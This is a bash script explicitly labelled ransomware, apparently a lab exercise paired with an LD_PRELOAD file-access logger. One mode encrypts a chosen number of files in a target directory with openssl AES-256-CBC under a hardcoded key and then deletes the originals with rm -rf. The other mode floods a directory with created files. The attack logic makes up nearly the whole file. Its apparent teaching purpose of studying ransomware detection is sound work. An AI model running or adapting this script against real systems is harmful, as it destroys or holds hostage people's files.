#!/bin/bash

# LD_PRELOAD=./logger.so /bin/ls

function usage(){
    printf "Usage:\n-1)\t./ransomware -e <numofFilestoEncrypt> -d <directorty>\n-2)\t./ransomware -c <numofFilestoCreate> -d <directorty>\n--\t./ransomware -h <help\nOptions:\n-f\tInsert 1 for file encryption or 2 for file creation.\n-e\tNumber of files to Encrypt (if -f 1).\n-c\tNumber of files to Create (if -f 2).\n-d\tDirectory for file encryption/creation (if -f 1 or 2).\n-h\tHelp\n"
}
while getopts hf:e:c:d: option
do
case "${option}"
in
f) FUNC=${OPTARG};;
e) numofFilestoEncrypt=${OPTARG};;
c) numofFilestoCreate=${OPTARG};;
d) DIR=${OPTARG};;
h) usage;;                                  # Third Function of ransomware: Help
?) echo "No -${OPTARG} argument found.";;
esac
done
key="1234"

#                            __ First Function of ransomware: Encrypt files __
j=0
if [[ $FUNC -eq 1 ]];then
    echo "You chose ${FUNC} File encryption here!"
    # (1) Create the <-e> files to be encrypted from the provided directory
    for i in $(seq 1 $numofFilestoEncrypt);
    do
        # dd if=/dev/zero of=${DIR}/efile${i}.txt bs=100 count=1
        # echo -e "Hello!\nThis is file${i} ready to be encrypted.\nBye!" > ${DIR}/efile${i}.txt
        LD_PRELOAD=./logger.so ./ransom_logs "${DIR}" "e" "$i"
    done
    for i in $DIR/**; do
        if [[ j -lt $numofFilestoEncrypt ]];then
            ((j++))
            # (2) Produce the new encrypted files
            `openssl enc -aes-256-cbc -in ${DIR}/efile$j.txt -pbkdf2 -out ${DIR}/efile$j.txt.encrypt -k $key` 
            LD_PRELOAD=./logger.so ./ransom_logs "${DIR}" "ee" "$j"
            # (3) Delete original files
            rm -rf efile${j}.txt
        fi
    done
    # for i in $DIR/**; do
    #     `openssl aes-256-ecb -in efile${i}.txt.encrypt -out efile${i}.txt -d -k $key` 
    # done
    exit
fi

#                   __ Second Function of ransomware: Create a big volume of files __
    #Creates <-c># files of 1kb of random data
if [[ $FUNC -eq 2 ]];then
    echo "You chose ${FUNC} File creation here!"
    for i in $(seq 1 $numofFilestoCreate);
    do
        # dd if=/dev/urandom of=${DIR}/cfile${i}.txt bs=100 count=1
        LD_PRELOAD=./logger.so ./ransom_logs "${DIR}" "c" "$i"
    done
fi


if [[ $FUNC -ne 1 ]] && [[ $FUNC -ne 2 ]];then
    echo "Please choose between 1 or 2 for function argument."
    printf "1) File encryption.\n"
    printf "2) File Creation.\n"
    usage
    exit 1
fi